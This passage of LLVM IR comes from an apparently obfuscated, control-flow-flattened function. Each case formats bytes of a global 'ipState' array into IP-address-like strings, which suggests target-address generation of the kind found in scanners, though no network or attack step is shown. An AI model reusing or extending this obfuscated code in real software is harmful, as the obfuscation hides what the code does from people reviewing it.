  %528 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %529 = zext i8 %528 to i32
  %530 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %531 = zext i8 %530 to i32
  %532 = call i32 (i8*, i8*, ...) @szprintf(i8* %527, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.232, i32 0, i32 0), i32 %529, i32 %531)
  store i32 -856594543, i32* %switchVar
  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  %534 = load i32, i32* %1, align 4
  %535 = icmp eq i32 %534, 47
  %536 = select i1 %535, i32 1861171464, i32 1390921466
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %539 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %540 = zext i8 %539 to i32
  %541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %542 = zext i8 %541 to i32
  %543 = call i32 (i8*, i8*, ...) @szprintf(i8* %538, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.233, i32 0, i32 0), i32 %540, i32 %542)
  store i32 1390921466, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i32, i32* %1, align 4
  %546 = icmp eq i32 %545, 48
  %547 = select i1 %546, i32 -1280923565, i32 1469915228
  store i32 %547, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %550 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %551 = zext i8 %550 to i32
  %552 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %553 = zext i8 %552 to i32
  %554 = call i32 (i8*, i8*, ...) @szprintf(i8* %549, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.234, i32 0, i32 0), i32 %551, i32 %553)
  store i32 1469915228, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  %556 = load i32, i32* %1, align 4
  %557 = icmp eq i32 %556, 49
  %558 = select i1 %557, i32 -1544401206, i32 697623032
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %562 = zext i8 %561 to i32
  %563 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %564 = zext i8 %563 to i32
  %565 = call i32 (i8*, i8*, ...) @szprintf(i8* %560, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.235, i32 0, i32 0), i32 %562, i32 %564)
  store i32 697623032, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = load i32, i32* %1, align 4
  %568 = icmp eq i32 %567, 50
  %569 = select i1 %568, i32 -1589798113, i32 -2059035203
  store i32 %569, i32* %switchVar
  br label %loopEnd

; <label>:570:                                    ; preds = %loopEntry
  %571 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %572 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %573 = zext i8 %572 to i32
  %574 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %575 = zext i8 %574 to i32
  %576 = call i32 (i8*, i8*, ...) @szprintf(i8* %571, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.236, i32 0, i32 0), i32 %573, i32 %575)
  store i32 -2059035203, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = load i32, i32* %1, align 4
  %579 = icmp eq i32 %578, 51
  %580 = select i1 %579, i32 -1481430923, i32 -768885822
  store i32 %580, i32* %switchVar
  br label %loopEnd

; <label>:581:                                    ; preds = %loopEntry
  %582 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %583 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %584 = zext i8 %583 to i32
  %585 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %586 = zext i8 %585 to i32
  %587 = call i32 (i8*, i8*, ...) @szprintf(i8* %582, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i32 %584, i32 %586)
  store i32 -768885822, i32* %switchVar
  br label %loopEnd

; <label>:588:                                    ; preds = %loopEntry
  %589 = load i32, i32* %1, align 4
  %590 = icmp eq i32 %589, 52
  %591 = select i1 %590, i32 1718920092, i32 -1682935939
  store i32 %591, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %594 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %595 = zext i8 %594 to i32
  %596 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %597 = zext i8 %596 to i32
  %598 = call i32 (i8*, i8*, ...) @szprintf(i8* %593, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.237, i32 0, i32 0), i32 %595, i32 %597)
  store i32 -1682935939, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i32, i32* %1, align 4
  %601 = icmp eq i32 %600, 53
  %602 = select i1 %601, i32 -1594726682, i32 818124809
  store i32 %602, i32* %switchVar
  br label %loopEnd

; <label>:603:                                    ; preds = %loopEntry
  %604 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %605 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %606 = zext i8 %605 to i32
  %607 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %608 = zext i8 %607 to i32
  %609 = call i32 (i8*, i8*, ...) @szprintf(i8* %604, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.238, i32 0, i32 0), i32 %606, i32 %608)
  store i32 818124809, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = load i32, i32* %1, align 4
  %612 = icmp eq i32 %611, 54
  %613 = select i1 %612, i32 -1571217298, i32 -2115201751
  store i32 %613, i32* %switchVar
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %616 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %617 = zext i8 %616 to i32
  %618 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %619 = zext i8 %618 to i32
  %620 = call i32 (i8*, i8*, ...) @szprintf(i8* %615, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.239, i32 0, i32 0), i32 %617, i32 %619)
  store i32 -2115201751, i32* %switchVar
  br label %loopEnd

; <label>:621:                                    ; preds = %loopEntry
  %622 = load i32, i32* %1, align 4
  %623 = icmp eq i32 %622, 55
  %624 = select i1 %623, i32 43877092, i32 -1118813476
  store i32 %624, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  %626 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %628 = zext i8 %627 to i32
  %629 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %630 = zext i8 %629 to i32
  %631 = call i32 (i8*, i8*, ...) @szprintf(i8* %626, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.240, i32 0, i32 0), i32 %628, i32 %630)
  store i32 -1118813476, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i32, i32* %1, align 4
  %634 = icmp eq i32 %633, 56
  %635 = select i1 %634, i32 -735603139, i32 -474579202
  store i32 %635, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  %637 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %638 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %639 = zext i8 %638 to i32
  %640 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %641 = zext i8 %640 to i32
  %642 = call i32 (i8*, i8*, ...) @szprintf(i8* %637, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.241, i32 0, i32 0), i32 %639, i32 %641)
  store i32 -474579202, i32* %switchVar
  br label %loopEnd

; <label>:643:                                    ; preds = %loopEntry
  %644 = load i32, i32* %1, align 4
  %645 = icmp eq i32 %644, 57
  %646 = select i1 %645, i32 1855784263, i32 -376642005
  store i32 %646, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  %648 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %649 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %650 = zext i8 %649 to i32
  %651 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %652 = zext i8 %651 to i32
  %653 = call i32 (i8*, i8*, ...) @szprintf(i8* %648, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.242, i32 0, i32 0), i32 %650, i32 %652)
  store i32 -376642005, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i32, i32* %1, align 4
  %656 = icmp eq i32 %655, 58
  %657 = select i1 %656, i32 -144710476, i32 -32022665
  store i32 %657, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %660 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %661 = zext i8 %660 to i32
  %662 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %663 = zext i8 %662 to i32
  %664 = call i32 (i8*, i8*, ...) @szprintf(i8* %659, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.243, i32 0, i32 0), i32 %661, i32 %663)
  store i32 -32022665, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32, i32* %1, align 4
  %667 = icmp eq i32 %666, 59
  %668 = select i1 %667, i32 2013766544, i32 1569585333
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %671 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %672 = zext i8 %671 to i32
  %673 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %674 = zext i8 %673 to i32
  %675 = call i32 (i8*, i8*, ...) @szprintf(i8* %670, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.244, i32 0, i32 0), i32 %672, i32 %674)
  store i32 1569585333, i32* %switchVar
  br label %loopEnd

; <label>:676:                                    ; preds = %loopEntry
  %677 = load i32, i32* %1, align 4
  %678 = icmp eq i32 %677, 60
  %679 = select i1 %678, i32 -1086125826, i32 -1818457857
  store i32 %679, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %682 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %683 = zext i8 %682 to i32
  %684 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %685 = zext i8 %684 to i32
  %686 = call i32 (i8*, i8*, ...) @szprintf(i8* %681, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.245, i32 0, i32 0), i32 %683, i32 %685)
  store i32 -1818457857, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %1, align 4
  %689 = icmp eq i32 %688, 61
  %690 = select i1 %689, i32 -480808470, i32 -1750698492
  store i32 %690, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %693 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %694 = zext i8 %693 to i32
  %695 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %696 = zext i8 %695 to i32
  %697 = call i32 (i8*, i8*, ...) @szprintf(i8* %692, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.246, i32 0, i32 0), i32 %694, i32 %696)
  store i32 -1750698492, i32* %switchVar
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  %699 = load i32, i32* %1, align 4
  %700 = icmp eq i32 %699, 62
  %701 = select i1 %700, i32 -1867820177, i32 2122339191
  store i32 %701, i32* %switchVar
  br label %loopEnd

; <label>:702:                                    ; preds = %loopEntry
  %703 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %704 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %705 = zext i8 %704 to i32
  %706 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %707 = zext i8 %706 to i32
  %708 = call i32 (i8*, i8*, ...) @szprintf(i8* %703, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.247, i32 0, i32 0), i32 %705, i32 %707)
  store i32 2122339191, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i32, i32* %1, align 4
  %711 = icmp eq i32 %710, 63
  %712 = select i1 %711, i32 298356607, i32 -585178581
  store i32 %712, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %715 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %716 = zext i8 %715 to i32
  %717 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %718 = zext i8 %717 to i32
  %719 = call i32 (i8*, i8*, ...) @szprintf(i8* %714, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.248, i32 0, i32 0), i32 %716, i32 %718)
  store i32 -585178581, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  %721 = load i32, i32* %1, align 4
  %722 = icmp eq i32 %721, 64
  %723 = select i1 %722, i32 -1684794353, i32 389487654
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %726 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %727 = zext i8 %726 to i32
  %728 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %729 = zext i8 %728 to i32
  %730 = call i32 (i8*, i8*, ...) @szprintf(i8* %725, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.249, i32 0, i32 0), i32 %727, i32 %729)
  store i32 389487654, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  %732 = load i32, i32* %1, align 4
  %733 = icmp eq i32 %732, 65
  %734 = select i1 %733, i32 -1720582419, i32 -2128247146
  store i32 %734, i32* %switchVar
  br label %loopEnd

; <label>:735:                                    ; preds = %loopEntry
  %736 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %737 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %738 = zext i8 %737 to i32
  %739 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %740 = zext i8 %739 to i32
  %741 = call i32 (i8*, i8*, ...) @szprintf(i8* %736, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.250, i32 0, i32 0), i32 %738, i32 %740)
  store i32 -2128247146, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  %743 = load i32, i32* %1, align 4
  %744 = icmp eq i32 %743, 66
  %745 = select i1 %744, i32 -1674726786, i32 -1660782848
  store i32 %745, i32* %switchVar
  br label %loopEnd

; <label>:746:                                    ; preds = %loopEntry
  %747 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %748 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %749 = zext i8 %748 to i32
  %750 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %751 = zext i8 %750 to i32
  %752 = call i32 (i8*, i8*, ...) @szprintf(i8* %747, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.251, i32 0, i32 0), i32 %749, i32 %751)
  store i32 -1660782848, i32* %switchVar
  br label %loopEnd

; <label>:753:                                    ; preds = %loopEntry
  %754 = load i32, i32* %1, align 4
  %755 = icmp eq i32 %754, 67
  %756 = select i1 %755, i32 -927126051, i32 1301336999
  store i32 %756, i32* %switchVar
  br label %loopEnd

; <label>:757:                                    ; preds = %loopEntry
  %758 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %759 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %760 = zext i8 %759 to i32
  %761 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %762 = zext i8 %761 to i32
  %763 = call i32 (i8*, i8*, ...) @szprintf(i8* %758, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.252, i32 0, i32 0), i32 %760, i32 %762)
  store i32 1301336999, i32* %switchVar
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  %765 = load i32, i32* %1, align 4
  %766 = icmp eq i32 %765, 68
  %767 = select i1 %766, i32 -321597685, i32 -12460095
  store i32 %767, i32* %switchVar
  br label %loopEnd

; <label>:768:                                    ; preds = %loopEntry
  %769 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %770 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %771 = zext i8 %770 to i32
  %772 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %773 = zext i8 %772 to i32
  %774 = call i32 (i8*, i8*, ...) @szprintf(i8* %769, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.253, i32 0, i32 0), i32 %771, i32 %773)
  store i32 -12460095, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  %776 = load i32, i32* %1, align 4
  %777 = icmp eq i32 %776, 69
  %778 = select i1 %777, i32 -546469889, i32 -1923199020
  store i32 %778, i32* %switchVar
  br label %loopEnd

; <label>:779:                                    ; preds = %loopEntry
  %780 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %781 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %782 = zext i8 %781 to i32
  %783 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %784 = zext i8 %783 to i32
  %785 = call i32 (i8*, i8*, ...) @szprintf(i8* %780, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.254, i32 0, i32 0), i32 %782, i32 %784)
  store i32 -1923199020, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  %787 = load i32, i32* %1, align 4
  %788 = icmp eq i32 %787, 70
  %789 = select i1 %788, i32 843038524, i32 -64091027
  store i32 %789, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %792 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %793 = zext i8 %792 to i32
  %794 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %795 = zext i8 %794 to i32
  %796 = call i32 (i8*, i8*, ...) @szprintf(i8* %791, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.255, i32 0, i32 0), i32 %793, i32 %795)
  store i32 -64091027, i32* %switchVar
  br label %loopEnd

; <label>:797:                                    ; preds = %loopEntry
  %798 = load i32, i32* %1, align 4
  %799 = icmp eq i32 %798, 71
  %800 = select i1 %799, i32 -1133099796, i32 1601515308
  store i32 %800, i32* %switchVar
  br label %loopEnd

; <label>:801:                                    ; preds = %loopEntry
  %802 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %803 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %804 = zext i8 %803 to i32
  %805 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %806 = zext i8 %805 to i32
  %807 = call i32 (i8*, i8*, ...) @szprintf(i8* %802, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.256, i32 0, i32 0), i32 %804, i32 %806)
  store i32 1601515308, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load i32, i32* %1, align 4
  %810 = icmp eq i32 %809, 72
  %811 = select i1 %810, i32 -601847766, i32 -413124594
  store i32 %811, i32* %switchVar
  br label %loopEnd

; <label>:812:                                    ; preds = %loopEntry
  %813 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %814 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %815 = zext i8 %814 to i32
  %816 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %817 = zext i8 %816 to i32
  %818 = call i32 (i8*, i8*, ...) @szprintf(i8* %813, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.257, i32 0, i32 0), i32 %815, i32 %817)
  store i32 -413124594, i32* %switchVar
  br label %loopEnd

; <label>:819:                                    ; preds = %loopEntry
  %820 = load i32, i32* %1, align 4
  %821 = icmp eq i32 %820, 73
  %822 = select i1 %821, i32 1184777280, i32 1170197006
  store i32 %822, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  %824 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %825 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %826 = zext i8 %825 to i32
  %827 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %828 = zext i8 %827 to i32
  %829 = call i32 (i8*, i8*, ...) @szprintf(i8* %824, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.258, i32 0, i32 0), i32 %826, i32 %828)
  store i32 1170197006, i32* %switchVar
  br label %loopEnd

; <label>:830:                                    ; preds = %loopEntry
  %831 = load i32, i32* %1, align 4
  %832 = icmp eq i32 %831, 74
  %833 = select i1 %832, i32 -1919220713, i32 -484374830
  store i32 %833, i32* %switchVar
  br label %loopEnd

; <label>:834:                                    ; preds = %loopEntry
  %835 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %836 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %837 = zext i8 %836 to i32
  %838 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %839 = zext i8 %838 to i32
  %840 = call i32 (i8*, i8*, ...) @szprintf(i8* %835, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.259, i32 0, i32 0), i32 %837, i32 %839)
  store i32 -484374830, i32* %switchVar
  br label %loopEnd

; <label>:841:                                    ; preds = %loopEntry
  %842 = load i32, i32* %1, align 4
  %843 = icmp eq i32 %842, 75
  %844 = select i1 %843, i32 -695647246, i32 -1698960282
  store i32 %844, i32* %switchVar
  br label %loopEnd

; <label>:845:                                    ; preds = %loopEntry
  %846 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %847 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %848 = zext i8 %847 to i32
  %849 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %850 = zext i8 %849 to i32
  %851 = call i32 (i8*, i8*, ...) @szprintf(i8* %846, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.260, i32 0, i32 0), i32 %848, i32 %850)
  store i32 -1698960282, i32* %switchVar
  br label %loopEnd

; <label>:852:                                    ; preds = %loopEntry
  %853 = load i32, i32* %1, align 4
  %854 = icmp eq i32 %853, 76
  %855 = select i1 %854, i32 -734958684, i32 740125440
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %858 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %859 = zext i8 %858 to i32
  %860 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %861 = zext i8 %860 to i32
  %862 = call i32 (i8*, i8*, ...) @szprintf(i8* %857, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.261, i32 0, i32 0), i32 %859, i32 %861)
  store i32 740125440, i32* %switchVar
  br label %loopEnd

; <label>:863:                                    ; preds = %loopEntry
  %864 = load i32, i32* %1, align 4
  %865 = icmp eq i32 %864, 77
  %866 = select i1 %865, i32 -492168665, i32 1883273579
  store i32 %866, i32* %switchVar
  br label %loopEnd

; <label>:867:                                    ; preds = %loopEntry
  %868 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %869 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %870 = zext i8 %869 to i32
  %871 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %872 = zext i8 %871 to i32
  %873 = call i32 (i8*, i8*, ...) @szprintf(i8* %868, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.262, i32 0, i32 0), i32 %870, i32 %872)
  store i32 1883273579, i32* %switchVar
  br label %loopEnd

; <label>:874:                                    ; preds = %loopEntry
  %875 = load i32, i32* %1, align 4
  %876 = icmp eq i32 %875, 78
  %877 = select i1 %876, i32 -440043556, i32 1766663056
  store i32 %877, i32* %switchVar
  br label %loopEnd

; <label>:878:                                    ; preds = %loopEntry
  %879 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %880 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %881 = zext i8 %880 to i32
  %882 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %883 = zext i8 %882 to i32
  %884 = call i32 (i8*, i8*, ...) @szprintf(i8* %879, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.263, i32 0, i32 0), i32 %881, i32 %883)
  store i32 1766663056, i32* %switchVar
  br label %loopEnd

; <label>:885:                                    ; preds = %loopEntry
  %886 = load i32, i32* %1, align 4
  %887 = icmp eq i32 %886, 79
  %888 = select i1 %887, i32 -783305806, i32 -1234506833
  store i32 %888, i32* %switchVar
  br label %loopEnd

; <label>:889:                                    ; preds = %loopEntry
  %890 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %891 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %892 = zext i8 %891 to i32
  %893 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %894 = zext i8 %893 to i32
  %895 = call i32 (i8*, i8*, ...) @szprintf(i8* %890, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.264, i32 0, i32 0), i32 %892, i32 %894)
  store i32 -1234506833, i32* %switchVar
  br label %loopEnd

; <label>:896:                                    ; preds = %loopEntry
  %897 = load i32, i32* %1, align 4
